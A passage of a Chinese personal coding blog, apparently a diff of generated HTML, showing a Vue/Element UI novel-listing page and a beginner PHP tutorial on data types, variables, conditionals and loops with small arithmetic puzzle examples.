&lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/1989/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/1/1666.jpg&quot; alt=&quot;开局签到荒古圣体&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;J神&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/1989/&quot;&gt;开局签到荒古圣体&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;【不废柴，不舔狗，天骄争霸暴爽无敌流】君逍遥穿越玄幻世界，成为荒古世家神子，拥有无敌背景，惊世天赋，更得到签到系统，......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/159582/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/159/159941.jpg&quot; alt=&quot;不正经的魔导师&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;最爱吃青柠檬&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/159582/&quot;&gt;不正经的魔导师&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;洛林“我老婆铭可就是一个没长大的小学生！每次我去上课总是给我找茬捣乱，明明是个御姐却伪装成小萝莉，可耻！看到别人遇到危险......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/126148/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/125/125979.jpg&quot; alt=&quot;死遁后我逆袭成女帝&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;楚倾歌风漓夜&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/126148/&quot;&gt;死遁后我逆袭成女帝&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;死遁后我逆袭成女帝最新章节由网友提供《死遁后我逆袭成女帝》情节跌宕起伏、扣人心弦，是一本情节与文笔俱佳的都市言情类型小说......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/145985/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/145/145930.jpg&quot; alt=&quot;假太监：开局撞破皇后偷香&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;天涯文相&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/145985/&quot;&gt;假太监：开局撞破皇后偷香&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;陆云穿越了。变成一个太监不说，还意外撞破了皇后的偷香现场。怎么办？在线等，挺急的！……幸好，有神级签到系统在手，且看他如......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/35915/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/35/35948.jpg&quot; alt=&quot;西游天庭小兵&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;雪山白术&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/35915/&quot;&gt;西游天庭小兵&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;“陛下不好了！下凡捉妖的天兵天将全被打趴了！”“陛下大喜事！狱神出手了，妖怪都被打趴了！”“陛下不好了！狱神突然收手……......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/114022/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/113/113745.jpg&quot; alt=&quot;国王&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;新海月1&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/114022/&quot;&gt;国王&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;简介：万族共存，剑与魔法交相辉映，人族、海族、精灵、矮人、兽人……争先绽放文明之光，谱写史诗悲歌！………海月新书来啦，幼......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/29803/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/29/29880.jpg&quot; alt=&quot;逆道战神&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;楚枫&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/29803/&quot;&gt;逆道战神&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;论潜力，不算天才，可玄功武技，皆可无师自通。论实力，任凭你有万千至宝，但定不敌我界灵大军。我是谁？天下众生视我为修罗，却......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/7327/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/7/7696.jpg&quot; alt=&quot;迪迦的传说&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;槭落枫叶&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/7327/&quot;&gt;迪迦的传说&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        穿越到了迪迦奥特曼的世界，可发光的金字塔里却没有迪迦？不过没关系，我有神光棒。......</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;&lt;/div&gt;&lt;/el-tab-pane&gt;</span><br><span class="line">  &lt;el-tab-pane label=&quot;武侠&quot;&gt;配置管理&lt;/el-tab-pane&gt;</span><br><span class="line">  &lt;el-tab-pane label=&quot;都市&quot;&gt;角色管理&lt;/el-tab-pane&gt;</span><br><span class="line">  &lt;el-tab-pane label=&quot;历史&quot;&gt;定时任务补偿&lt;/el-tab-pane&gt;</span><br><span class="line">&lt;/el-tabs&gt;</span><br><span class="line">  &lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;5&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        new Vue(&#123;</span><br><span class="line">            el: &#x27;#app&#x27;,</span><br><span class="line">            data: function () &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    visible: false,</span><br><span class="line">                    iframeSrc: &#x27;&#x27;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                handleOpen(key, keyPath) &#123;</span><br><span class="line">                    console.log(key, keyPath);</span><br><span class="line">                &#125;,</span><br><span class="line">                handleClose(key, keyPath) &#123;</span><br><span class="line">                    console.log(key, keyPath);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                    router() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin.php&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    router2() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin2.php&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .ce &#123;</span><br><span class="line">            width: 80vh;</span><br><span class="line">            margin-right: 50vh;</span><br><span class="line">            text-align: right;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line"> .el-row &#123;</span><br><span class="line">    &amp;:last-child &#123;</span><br><span class="line">      margin-bottom: 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bg-purple-dark &#123;</span><br><span class="line">    background: #99a9bf;</span><br><span class="line">  &#125;</span><br><span class="line">  .bg-purple &#123;</span><br><span class="line">    background: #d3dce6;</span><br><span class="line">    height: 230vh;</span><br><span class="line">  &#125;</span><br><span class="line">  .bg-purple-light &#123;</span><br><span class="line">    background: #e5e9f2;</span><br><span class="line">    height: 10px;</span><br><span class="line">  &#125;</span><br><span class="line">  .grid-content &#123;</span><br><span class="line">    border-radius: 4px;</span><br><span class="line">    min-height: 36px;</span><br><span class="line">  &#125;</span><br><span class="line">  .item&#123;float:left;width:50%;height:156px;margin-bottom:10px;position:relative;overflow:hidden;&#125;.class .item&#123;width:33.3%;&#125;</span><br><span class="line">.item .image&#123;position:absolute;top:0px;left:5px;&#125;</span><br><span class="line">.item .image img&#123;width:120px;height:150px;background-color:#FFF;border:1px solid #DDD;padding:1px;&#125;</span><br><span class="line">.item dl&#123;padding-left:140px;padding-right:5px;&#125;</span><br><span class="line">.item dl dt&#123;border-bottom:1px dotted #A6D3E8;font-size:14px;font-weight:700;height:25px;line-height:25px;overflow:hidden;&#125;</span><br><span class="line">.item dl dt span&#123;color:#999;float:right;font-weight:400;&#125;</span><br><span class="line">.item dl dd&#123;height:120px;line-height:20px;overflow:hidden;padding:7px 0 0;color:#AAA;&#125;</span><br><span class="line">.head&#123;</span><br><span class="line">    height: 55px;</span><br><span class="line">    background-color: #FFFFFF;</span><br><span class="line">&#125;</span><br><span class="line">.biquge&#123;float:left;&#125;</span><br><span class="line">.biquge a&#123;font-family: 楷体_GB2312, STKaiti;display: block;height: 50px;width: 200px;line-height: 50px;color: #0065b5;font-size: 36px;text-shadow: #8c8989 3px 3px 6px;text-decoration:none;&#125;</span><br><span class="line">.bg-purple-light-zhan&#123;</span><br><span class="line">    background: #e5e9f2;</span><br><span class="line">    height: 10px;</span><br><span class="line">&#125;</span><br><span class="line">/* .bg-purple-light-zhan a&#123;</span><br><span class="line">    font-family: 楷体_GB2312, STKaiti;display: block;color: #0065b5;text-shadow: #8c8989 3px 3px 6px;text-decoration:none;font-size: 15px;</span><br><span class="line">&#125; */</span><br><span class="line">.search&#123;float:left;width:500px;overflow:hidden;&#125;</span><br><span class="line">.search form&#123;margin:10px;position: relative; clear: both;&#125;</span><br><span class="line">.search .text&#123;width:50%; padding-left:10px;height: 30px;line-height:30px;overflow: hidden;border: 1px solid #ddd;border-right:51px solid #fff;font-size:14px;&#125;</span><br><span class="line">.search .btn&#123; position: absolute; z-index: 1; right: 0; top: 0; margin: 0; width: 50px; height: 30px; border: 1px solid #ddd; background: transparent url(/images/so.png) no-repeat 50% 50%; -webkit-background-size: 20px 21px; -moz-background-size: 20px 21px; -o-background-size: 20px 21px; background-size: 20px 21px;border-radius:0px; &#125;</span><br><span class="line">.share&#123;float:right;margin-top:10px;border:1px dotted #ddd;padding:6px;color:#CCC;&#125;</span><br><span class="line">.wrap&#123;height:50px;margin:10px auto;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器中打开页面的绝对路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217092747458.png" alt="image-20231217092747458"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/17/Element/" data-id="clq8swwnj0000vku40vkb8cmm" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-php基础" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/12/php%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time class="post-time" datetime="2023-12-12T06:06:52.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">12</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/12/php%E5%9F%BA%E7%A1%80/">php基础</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="php基础"><a href="#php基础" class="headerlink" title="php基础"></a>php基础</h2><ul>
+<li><p>PHP脚本以<?php开始，以?>结束</p>
+</li>
+<li><p>PHP注释类似C语言:“I&#x2F;”单行注释“&#x2F;<em>…</em>&#x2F;”多行注释</p>
+</li>
+<li><p>PHP脚本可以放在文档任何地方</p>
+</li>
+</ul>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">#鸡兔同笼：假设在笼子里有头数为8的动物，总共有22只脚</span><br><span class="line">for ($x=1; $x&lt;=8; $x++)</span><br><span class="line">&#123;</span><br><span class="line">    $y = 8 - $x;</span><br><span class="line">    if ($x * 2 + $y * 4 == 22)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;鸡为&quot;. $x;</span><br><span class="line">        echo &quot;&lt;br&gt;鸭为&quot;  . $y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#n张5毛，y张1块，z张10块，t张50，x张100，问我手上一共有156钱，一共有多少种组合，满足我手上的钱</span><br><span class="line">$i = 0;</span><br><span class="line">for ($n = 0; 0.5 * $n &lt;= 156; $n++)</span><br><span class="line">&#123;</span><br><span class="line">    for ($y = 0; $y &lt;= 156; $y++)</span><br><span class="line">    &#123;</span><br><span class="line">        for ($x = 0; 100 * $x &lt;= 156; $x++)</span><br><span class="line">        &#123;</span><br><span class="line">            for ($t = 0; 50 * $t &lt;= 156; $t++)</span><br><span class="line">            &#123;</span><br><span class="line">                for ($z = 0; 10 * $z &lt;= 156; $z++)</span><br><span class="line">                &#123;</span><br><span class="line">                    if (0.5 * $n + 100 * $x + $y + 50 * $t + 10 * $z == 156)</span><br><span class="line">                    &#123;</span><br><span class="line">                        $i = $i + 1;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;br&gt;一共有&quot;.$i;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231212140748446.png" alt="image-20231212140748446"></p>
+<h3 id="echo-和-print-语句"><a href="#echo-和-print-语句" class="headerlink" title="echo 和 print 语句"></a>echo 和 print 语句</h3><p>echo 和 print 区别:</p>
+<ul>
+<li>echo - 可以输出一个或多个字符串</li>
+<li>print - 只允许输出一个字符串，返回值总为 1</li>
+</ul>
+<p><strong>注：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p>
+<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="标量数据类型"><a href="#标量数据类型" class="headerlink" title="标量数据类型"></a>标量数据类型</h4><blockquote>
+<p><strong>boolean(布尔型)</strong>:只有两个值，真(true)假(false)</p>
+<p><strong>string(字符串型)</strong>:是连续的字符序列，由数字，字母和符号组成，字符串中每字符只占一个字节，3种定义字符串的方式:单引号(“)双引号(“)定界符(&lt;&lt;&lt;)</p>
+<p><strong>integer(整型)</strong>:只能包含整数，可以用十进制，八进制，十六进制，八进制数字前面必须加O，十六进制前面必须加ox</p>
+<p><strong>folat(浮点型)</strong>:可以用来储存数字，也可以保存小数，精度大</p>
+</blockquote>
+<h4 id="复合数据类型"><a href="#复合数据类型" class="headerlink" title="复合数据类型"></a>复合数据类型</h4><blockquote>
+<p><strong>array(数组)</strong>:一组数据的集合，数组中每个数据称为一个元素，元素包括索引O和值两部分索引由数字或字符串组成，值可以是多种数据类型</p>
+<p>**object(对象)**︰面向过程·和面向对象</p>
+</blockquote>
+<h4 id="特殊数据类型"><a href="#特殊数据类型" class="headerlink" title="特殊数据类型"></a>特殊数据类型</h4><blockquote>
+<p><strong>resource(资源)</strong>:在使用资源时系统会自动启用垃圾回收机制，释放不在使用的资源，避免内存消耗殆尽</p>
+<p><strong>null(空值)</strong>:表示没有为该变量设置任何值，且不区分大小写</p>
+</blockquote>
+<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>设置常量，使用 define() 函数，函数语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )</span><br></pre></td></tr></table></figure>
+
+<p>使用常量时</p>
+<ul>
+<li><strong>name：</strong>必选参数，常量名称，即标志符。</li>
+<li><strong>value：</strong>必选参数，常量的值。</li>
+<li><strong>case_insensitive</strong> ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。</li>
+</ul>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>PHP 变量规则：</p>
+<ul>
+<li>变量以 $ 符号开始，后面跟着变量的名称</li>
+<li>变量名必须以字母或者下划线字符开始</li>
+<li>变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）</li>
+<li>变量名不能包含空格</li>
+<li>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</li>
+</ul>
+<h4 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h4><p>字符串变量用于包含有字符的值。</p>
+<p>在创建字符串之后，我们就可以对它进行操作了。您可以直接在函数中使用字符串，或者把它存储在变量中。</p>
+<p>在 PHP 中，只有一个字符串运算符。</p>
+<p>并置运算符 (.) 用于把两个字符串值连接起来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1=&quot;Hello world!&quot;;</span><br><span class="line">$txt2=&quot;What a nice day!&quot;;</span><br><span class="line">echo $txt1 . &quot; &quot; . $txt2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="if…Else语句"><a href="#if…Else语句" class="headerlink" title="if…Else语句"></a>if…Else语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">    条件成立时要执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">条件不成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">#列</span><br><span class="line">&lt;?php</span><br><span class="line">$t=date(&quot;H&quot;);</span><br><span class="line">if ($t&lt;&quot;20&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Have a good day!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231212191749127.png" alt="image-20231212191749127"></p>
+<h3 id="seitch语句"><a href="#seitch语句" class="headerlink" title="seitch语句"></a>seitch语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">switch (n)</span><br><span class="line">&#123;</span><br><span class="line">case label1:</span><br><span class="line">    如果 n=label1，此处代码将执行;</span><br><span class="line">    break;</span><br><span class="line">case label2:</span><br><span class="line">    如果 n=label2，此处代码将执行;</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>switch 语句用于根据多个不同条件执行不同动作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">$favcolor=&quot;red&quot;;</span><br><span class="line">switch ($favcolor)</span><br><span class="line">&#123;</span><br><span class="line">case &quot;red&quot;:</span><br><span class="line">    echo &quot;你喜欢的颜色是红色!&quot;;</span><br><span class="line">    break;</span><br><span class="line">case &quot;blue&quot;:</span><br><span class="line">    echo &quot;你喜欢的颜色是蓝色!&quot;;</span><br><span class="line">    break;</span><br><span class="line">case &quot;green&quot;:</span><br><span class="line">    echo &quot;你喜欢的颜色是绿色!&quot;;</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    echo &quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231212192353266.png" alt="image-20231212192353266"></p>
+<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>while 循环将重复执行代码块，直到指定的条件不成立。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">while (条件)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$i=1;</span><br><span class="line">while($i&lt;=5)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231212200435804.png" alt="image-20231212200435804"></p>
+<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for 循环用于您预先知道脚本需要运行的次数的情况。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (初始值; 条件; 增量)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参数：</p>
+<ul>
+<li><strong>初始值</strong>：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。</li>
+<li><strong>条件</strong>：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。</li>
+<li><strong>增量</strong>：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。</li>
+</ul>
+<p><strong>注：</strong>上面的<strong>初始值</strong>和<strong>增量</strong>参数可为空，或者有多个表达式（用逗号分隔）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">for ($i=1; $i&lt;=5; $i++)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;数字为 &quot; . $i . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
